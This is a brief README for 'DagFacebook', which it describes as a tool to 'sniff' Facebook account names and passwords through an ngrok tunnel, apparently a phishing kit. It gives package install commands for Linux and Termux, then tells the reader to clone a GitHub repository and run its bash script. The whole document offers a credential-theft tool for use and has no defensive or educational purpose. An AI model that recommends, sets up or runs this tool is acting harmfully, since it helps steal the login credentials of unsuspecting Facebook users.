# DagFacebook
Sniff Account and Password facebook with Ngrok

# Linux Install
1. apt-get install php
2. apt-get install curl
3. apt-get install unzip
# Termux Install
1. pkg install php
2. pkg install curl
3. pkg install unzip

# Usage
1. git clone https://github.com/foolsteams/DagFacebook
2. cd DagFacebook
3. bash dagfacebook.sh
